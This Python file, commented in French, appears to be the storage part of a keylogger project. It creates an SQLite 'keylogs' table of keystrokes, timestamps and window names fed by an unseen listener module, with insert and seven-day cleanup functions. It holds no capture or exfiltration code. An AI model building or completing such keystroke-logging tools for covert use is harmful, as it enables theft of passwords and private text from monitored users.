import sqlite3
import uuid
from datetime import datetime
from listener import flush_buffer, last_timestamp
DB_PATH = "keylogs.db"

#_____variables globales pour le buffer et le timestamp____________________________________________
key_data = flush_buffer()
ts = last_timestamp
window = "Window1" #temporaire a remplacer pars variable

SESSION_ID = str(uuid.uuid4())[:8]

#___________________________________________________________creation de la table_____________________________________________
def create_table():
    with sqlite3.connect(DB_PATH) as cur:
        cur.execute(""" CREATE TABLE IF NOT EXISTS keylogs(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        key TEXT,
        window TEXT,
        session_id TEXT DEFAULT 'user_session'         
            )
        """)
        cur.commit()

#___________________________________________________________ insertion de données____________________________________________

def insert_data(timestamp, key, window, session_id):
    with sqlite3.connect(DB_PATH) as cur:
            cur.execute("INSERT INTO keylogs(timestamp, key, window, session_id) VALUES (?, ?, ?, ?)", (timestamp, key, window, session_id))
            cur.commit()

#____________________________________________________________execution du code____________________________________________
create_table()

# netoyage

def clear_old(days=7):
    with sqlite3.connect(DB_PATH) as con:
        con.execute(
            "DELETE FROM keylogs WHERE timestamp < datetime('now', ?)",
            (f"-{days} days",)
        )
        con.commit()